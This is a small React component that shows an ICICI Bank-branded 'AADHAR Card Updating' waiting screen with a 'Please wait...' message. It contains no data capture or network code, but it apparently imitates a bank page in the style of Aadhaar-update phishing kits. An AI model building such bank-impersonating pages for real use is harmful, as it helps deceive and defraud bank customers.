import React from 'react';

const AADHARUpdatingPage = () => {
  return (
    <div className="container">
      <div className="header">
        <img src="/icici h.jpg" alt="ICICI Bank Logo" />
      </div>

      <div className="content">
        <h2>AADHAR Card Updating</h2>
        <div className="notification">
          <p>Your AADHAR details are being updated...</p>
        </div>
        <div className="timer">Please wait...</div>
      </div>

      <div className="footer">
        <p>&copy; ICICI Bank</p>
      </div>
    </div>
  );
};

export default AADHARUpdatingPage;
